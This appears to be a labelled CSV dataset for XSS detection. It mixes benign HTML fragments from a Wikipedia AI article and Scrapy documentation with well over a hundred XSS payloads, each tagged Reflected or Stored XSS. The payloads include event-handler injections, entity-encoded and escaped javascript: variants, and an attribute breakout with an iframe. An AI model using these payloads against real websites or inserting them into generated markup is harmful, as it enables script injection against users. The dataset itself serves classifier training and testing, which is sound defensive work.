Sentence,Final_Label
"<li><a href=""#CITEREFNRC1999"">NRC 1999 </a>, pp.&#160;216–222 </li>",Normal
"<track onmouseup=""alert(1)"">test</track>",Reflected XSS
"          <i data-toggle=""wy-nav-top"" class=""fa fa-bars""></i>",Normal
"<mark onclick=""alert(1)"">test</mark>",Reflected XSS
<svg><bdo onload=alert(1)></bdo>,Stored XSS
"<li><a href=""/wiki/Evolution_strategy"" title=""Evolution strategy"">Evolution strategy </a> </li>",Normal
"<textarea onmouseenter=""alert(1)"">test</textarea>",Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Kermany, D; Goldbaum, M; Zhang, Kang (2018). <a rel=""nofollow"" class=""external text"" href=""https://www.cell.com/action/captchaChallenge?redirectUri=%2Fcell%2Fpdf%2FS0092-8674%2818%2930154-5.pdf"">""Identifying Medical Diagnoses and Treatable Diseases by Image-Based Deep Learning"" </a> <span class=""cs1-format"">(PDF) ",Normal
<summary onpointermove=alert(1)>XSS</summary>,Reflected XSS
"	 </span>. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/2016arXiv160605830C"">2016arXiv160605830C </a>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2FTRO.2016.2624754"">10.1109/TRO.2016.2624754 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Transactions+on+Robotics&amp;rft.atitle=Past%2C+Present%2C+and+Future+of+Simultaneous+Localization+and+Mapping%3A+Toward+the+Robust-Perception+Age&amp;rft.volume=32&amp;rft.issue=6&amp;rft.pages=1309-1332&amp;rft.date=2016-12&amp;rft_id=info%3Aarxiv%2F1606.05830&amp;rft_id=info%3Adoi%2F10.1109%2FTRO.2016.2624754&amp;rft_id=info%3Abibcode%2F2016arXiv160605830C&amp;rft.aulast=Cadena&amp;rft.aufirst=Cesar&amp;rft.au=Carlone%2C+Luca&amp;rft.au=Carrillo%2C+Henry&amp;rft.au=Latif%2C+Yasir&amp;rft.au=Scaramuzza%2C+Davide&amp;rft.au=Neira%2C+Jose&amp;rft.au=Reid%2C+Ian&amp;rft.au=Leonard%2C+John+J.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<link rel=""canonical"" href=""https://docs.scrapy.org/en/latest/"" />",Normal
<svg><br onload=alert(1)></br>,Stored XSS
"<li ondblclick=""alert(1)"">test</li>",Reflected XSS
<svg><sub onload=alert(1)></sub>,Stored XSS
"<li><cite id=""CITEREFPoliLangdonMcPhee2008"" class=""citation book"">Poli, R.; Langdon, W. B.; McPhee, N. F. (2008). <a rel=""nofollow"" class=""external text"" href=""http://www.gp-field-guide.org.uk/""><i>A Field Guide to Genetic Programming </i> </a>. Lulu.com. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-1-4092-0073-4"" title=""Special:BookSources/978-1-4092-0073-4""><bdi>978-1-4092-0073-4 </bdi> </a> &#8211; via gp-field-guide.org.uk. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=A+Field+Guide+to+Genetic+Programming&amp;rft.pub=Lulu.com&amp;rft.date=2008&amp;rft.isbn=978-1-4092-0073-4&amp;rft.aulast=Poli&amp;rft.aufirst=R.&amp;rft.au=Langdon%2C+W.+B.&amp;rft.au=McPhee%2C+N.+F.&amp;rft_id=http%3A%2F%2Fwww.gp-field-guide.org.uk%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<li class=""toclevel-2 tocsection-43""><a href=""#Military""><span class=""tocnumber"">7.8 ",Normal
<svg><tt onload=alert(1)></tt>,Stored XSS
<code id=x tabindex=1 ondeactivate=alert(1)></code><input id=y autofocus>,Reflected XSS
"<svg><path><animateMotion onbegin=alert(1) dur=""1s"" repeatCount=""1"">",Stored XSS
"<marquee onpaste=""alert(1)"" contenteditable>test</marquee>",Reflected XSS
<sub id=x tabindex=1 onfocus=alert(1)></sub>,Reflected XSS
"      <li><a href=""#"">Docs</a> &raquo;</li>",Normal
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,Stored XSS
"<li id=""cite_note-199""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-199"">^ </a> </b> ",Normal
<object onpointerover=alert(1)>XSS</object>,Stored XSS
	 </span></a></dt><dd>Understand what Scrapy is and how it can help you.</dd>,Normal
"<p>Intelligent agents must be able to set goals and achieve them.<sup id=""cite_ref-Planning_110-0"" class=""reference""><a href=""#cite_note-Planning-110"">&#91;107&#93; </a> </sup> They need a way to visualize the future—a representation of the state of the world and be able to make predictions about how their actions will change it—and be able to make choices that maximize the <a href=""/wiki/Utility"" title=""Utility"">utility </a> (or ""value"") of available choices.<sup id=""cite_ref-Information_value_theory_111-0"" class=""reference""><a href=""#cite_note-Information_value_theory-111"">&#91;108&#93; </a> </sup>",Normal
"<ul><li><a href=""#CITEREFvan_der_WaltBernard2006"">van der Walt &amp; Bernard 2006 </a> </li> </ul>",Normal
<footer onpointerleave=alert(1)>XSS</footer>,Reflected XSS
<svg><rb onload=alert(1)></rb>,Stored XSS
"<canvas onmouseover=""alert(1)"">test</canvas>",Reflected XSS
"<li id=""cite_note-Representing_causation-95""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Representing_causation_95-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Representing_causation_95-1""><sup><i><b>b </b> </i> </sup> </a> ",Normal
eval(a+b+c+d),Stored XSS
"<style>:target {color: red;}</style><summary id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></summary>",Reflected XSS
"<pre draggable=""true"" ondragenter=""alert(1)"">test</pre>",Reflected XSS
"<svg onmousedown=""alert(1)"">test</svg>",Stored XSS
<svg><time onload=alert(1)></time>,Stored XSS
"<b onkeydown=""alert(1)"" contenteditable>test</b>",Reflected XSS
<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>,Stored XSS
"<sup id=""cite_ref-FOOTNOTEDomingos2015_152-0"" class=""reference""><a href=""#cite_note-FOOTNOTEDomingos2015-152"">&#91;149&#93; </a> </sup> Finally, a few ""emergent"" approaches look to simulating human intelligence extremely closely, and believe that <a href=""/wiki/Anthropomorphism"" title=""Anthropomorphism"">anthropomorphic </a> features like an <a href=""/wiki/Artificial_brain"" title=""Artificial brain"">artificial brain </a> or simulated <a href=""/wiki/Developmental_robotics"" title=""Developmental robotics"">child development </a> may someday reach a critical point where general intelligence emerges.<sup id=""cite_ref-Brain_simulation_153-0"" class=""reference""><a href=""#cite_note-Brain_simulation-153"">&#91;150&#93; </a> </sup>",Normal
<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>,Reflected XSS
"<iframe onkeydown=""alert(1)"" contenteditable>test</iframe>",Stored XSS
<svg><noscript onload=alert(1)></noscript>,Stored XSS
<source onpointerup=alert(1)>XSS</source>,Reflected XSS
<nav onpointermove=alert(1)>XSS</nav>,Reflected XSS
"<style>@keyframes x{}</style><rb style=""animation-name:x"" onanimationstart=""alert(1)""></rb>",Reflected XSS
"<li><cite id=""CITEREFRussellNorvig2003"" class=""citation""><a href=""/wiki/Stuart_J._Russell"" title=""Stuart J. Russell"">Russell, Stuart J. </a>; <a href=""/wiki/Peter_Norvig"" title=""Peter Norvig"">Norvig, Peter </a> (2003), <a rel=""nofollow"" class=""external text"" href=""http://aima.cs.berkeley.edu/""><i>Artificial Intelligence: A Modern Approach </i> </a> (2nd ed.), Upper Saddle River, New Jersey: Prentice Hall, <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/0-13-790395-2"" title=""Special:BookSources/0-13-790395-2""><bdi>0-13-790395-2 </bdi> </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence%3A+A+Modern+Approach&amp;rft.place=Upper+Saddle+River%2C+New+Jersey&amp;rft.edition=2nd&amp;rft.pub=Prentice+Hall&amp;rft.date=2003&amp;rft.isbn=0-13-790395-2&amp;rft.aulast=Russell&amp;rft.aufirst=Stuart+J.&amp;rft.au=Norvig%2C+Peter&amp;rft_id=http%3A%2F%2Faima.cs.berkeley.edu%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<svg><th onload=alert(1)></th>,Stored XSS
	 </span> </h3>,Normal
top[‘al\145rt’](1),Stored XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>. </li>",Normal
"    <link rel=""search"" title=""Search"" href=""search.html"" />",Normal
"<li id=""cite_note-35""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-35"">^ </a> </b> ",Normal
<dt id=x tabindex=1 onfocusin=alert(1)></dt>,Reflected XSS
"<colgroup draggable=""true"" ondragstart=""alert(1)"">test</colgroup>",Reflected XSS
"<isindex onpaste=""alert(1)"" contenteditable>test</isindex>",Reflected XSS
<address onpointerenter=alert(1)>XSS</address>,Reflected XSS
<input onpointerenter=alert(1)>XSS</input>,Reflected XSS
<link onpointerout=alert(1)>XSS</link>,Reflected XSS
"	 </span>. Dartmouth Summer Research Conference on Artificial Intelligence &#8211; via std.com, pdf scanned copy of the original. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=conference&amp;rft.btitle=An+Inductive+Inference+Machine&amp;rft.date=1956&amp;rft.aulast=Solomonoff&amp;rft.aufirst=Ray&amp;rft_id=http%3A%2F%2Fworld.std.com%2F~rjs%2Findinf56.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<svg><nextid onload=alert(1)></nextid>,Stored XSS
"<li><cite id=""CITEREFBrooks1991"" class=""citation encyclopaedia"">Brooks, R. A. (1991). ""How to build complete creatures rather than isolated cognitive simulators"".  In VanLehn, K. (ed.). <i>Architectures for Intelligence </i>. Hillsdale, NJ: Lawrence Erlbaum Associates. pp.&#160;225–239. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.52.9510"">10.1.1.52.9510 </a> ",Normal
"<object onbeforecopy=""alert(1)"" contenteditable>test</object>",Stored XSS
<script id=x tabindex=1 onactivate=alert(1)></script>,Stored XSS
<embed onpointerenter=alert(1)>XSS</embed>,Stored XSS
"<nextid onkeyup=""alert(1)"" contenteditable>test</nextid>",Reflected XSS
<svg><thead onload=alert(1)></thead>,Stored XSS
"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>",Reflected XSS
"<select onbeforecopy=""alert(1)"" contenteditable>test</select>",Reflected XSS
<object onpointermove=alert(1)>XSS</object>,Stored XSS
"<iframe onkeyup=""alert(1)"" contenteditable>test</iframe>",Stored XSS
"<svg onbeforepaste=""alert(1)"" contenteditable>test</svg>",Stored XSS
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Deep_learning"" title=""Deep learning"">Deep learning </a> </div>",Normal
 </div>,Normal
"<li><a href=""#CITEREFDyson1998"">Dyson 1998 </a> </li> </ul>",Normal
"<abbr onbeforepaste=""alert(1)"" contenteditable>test</abbr>",Reflected XSS
<STYLE>@import'http://.rocks/.css';</STYLE>,Stored XSS
"<style>@keyframes slidein {}</style><embed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></embed>",Stored XSS
"<li><a href=""/wiki/Integrated_circuit"" title=""Integrated circuit"">Integrated circuit </a> </li>",Normal
"<li><a href=""/wiki/Philosophy_of_artificial_intelligence"" title=""Philosophy of artificial intelligence"">Philosophy of artificial intelligence </a>&#160;/&#32;<a href=""/wiki/Philosophy_of_information"" title=""Philosophy of information"">information </a>&#160;/&#32;<a href=""/wiki/Philosophy_of_perception"" title=""Philosophy of perception"">perception </a>&#160;/&#32;<a href=""/wiki/Philosophy_of_self"" title=""Philosophy of self"">self </a> </li> </ul>",Normal
"<svg draggable=""true"" ondragstart=""alert(1)"">test</svg>",Stored XSS
"<script onkeyup=""alert(1)"" contenteditable>test</script>",Stored XSS
<svg><output onload=alert(1)></output>,Stored XSS
"<del onmouseleave=""alert(1)"">test</del>",Reflected XSS
"<style>:target {transform: rotate(180deg);}</style><nobr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nobr>",Reflected XSS
<svg><element onload=alert(1)></element>,Stored XSS
"<caption draggable=""true"" ondrag=""alert(1)"">test</caption>",Reflected XSS
<svg><shadow onload=alert(1)></shadow>,Stored XSS
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",Reflected XSS
"<table onbeforecopy=""alert(1)"" contenteditable>test</table>",Reflected XSS
<svg><title onload=alert(1)></title>,Stored XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=latimes.com&amp;rft.atitle=AlphaGo+beats+human+Go+champ+in+milestone+for+artificial+intelligence&amp;rft.date=2016&amp;rft.aulast=Borowiec&amp;rft.aufirst=Tracey+Lien%2C+Steven&amp;rft_id=https%3A%2F%2Fwww.latimes.com%2Fworld%2Fasia%2Fla-fg-korea-alphago-20160312-story.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<wbr onmousedown=""alert(1)"">test</wbr>",Reflected XSS
"won many visual pattern recognition competitions.<sup id=""cite_ref-schmidhuber2015_246-2"" class=""reference""><a href=""#cite_note-schmidhuber2015-246"">&#91;235&#93; </a> </sup>",Normal
<content id=x tabindex=1 onfocusin=alert(1)></content>,Reflected XSS
"<nextid oncontextmenu=""alert(1)"">test</nextid>",Reflected XSS
"<div onpaste=""alert(1)"" contenteditable>test</div>",Reflected XSS
"<tbody onbeforecopy=""alert(1)"" contenteditable>test</tbody>",Reflected XSS
<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>,Reflected XSS
"<a href=""/wiki/K-nearest_neighbor_algorithm"" class=""mw-redirect"" title=""K-nearest neighbor algorithm"">K-nearest neighbor algorithm </a>:",Normal
"<bgsound onbeforecut=""alert(1)"" contenteditable>test</bgsound>",Reflected XSS
"<li class=""toclevel-3 tocsection-18""><a href=""#Logic-based""><span class=""tocnumber"">5.2.2 ",Normal
"<em onmouseout=""alert(1)"">test</em>",Reflected XSS
			In other projects,Normal
"""><iframe src=""javascript:alert()"">",Stored XSS
"<li id=""cite_note-scholarpedia-249""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-scholarpedia_249-0"">^ </a> </b> ",Normal
"<div draggable=""true"" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>",Reflected XSS
"<head onpaste=""alert(1)"" contenteditable>test</head>",Reflected XSS
"<content oncopy=""alert(1)"" contenteditable>test</content>",Reflected XSS
"<dl onkeydown=""alert(1)"" contenteditable>test</dl>",Reflected XSS
"<dl draggable=""true"" ondrag=""alert(1)"">test</dl>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><col ondrop=alert(1) contenteditable>drop here</col>",Reflected XSS
"<embed draggable=""true"" ondragend=""alert(1)"">test</embed>",Stored XSS
"<style>@keyframes slidein {}</style><dt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dt>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></iframe>",Stored XSS
"<style>@keyframes x{}</style><sup style=""animation-name:x"" onanimationend=""alert(1)""></sup>",Reflected XSS
"<h3><span class=""mw-headline"" id=""AI_textbooks"">AI textbooks ",Normal
"	 </span> <span class=""toctext"">History ",Normal
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20141129044821/http://www.aaai.org/Library/Symposia/Fall/fs05-06"">""Machine Ethics"" </a>. <i>aaai.org </i>. Archived from <a rel=""nofollow"" class=""external text"" href=""http://www.aaai.org/Library/Symposia/Fall/fs05-06"">the original </a> on 29 November 2014. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=aaai.org&amp;rft.atitle=Machine+Ethics&amp;rft_id=http%3A%2F%2Fwww.aaai.org%2FLibrary%2FSymposia%2FFall%2Ffs05-06&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<select onpointerover=alert(1)>XSS</select>,Reflected XSS
</div>,Normal
"<main draggable=""true"" ondrag=""alert(1)"">test</main>",Reflected XSS
"<isindex draggable=""true"" ondragend=""alert(1)"">test</isindex>",Reflected XSS
"<content onpaste=""alert(1)"" contenteditable>test</content>",Reflected XSS
"<picture onbeforepaste=""alert(1)"" contenteditable>test</picture>",Reflected XSS
"<li id=""cite_note-FOOTNOTEWengMcClellandPentlandSporns2001-168""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEWengMcClellandPentlandSporns2001_168-0"">^ </a> </b> ",Normal
<sup id=x tabindex=1 onfocus=alert(1)></sup>,Reflected XSS
"<main draggable=""true"" ondragleave=""alert(1)"">test</main>",Reflected XSS
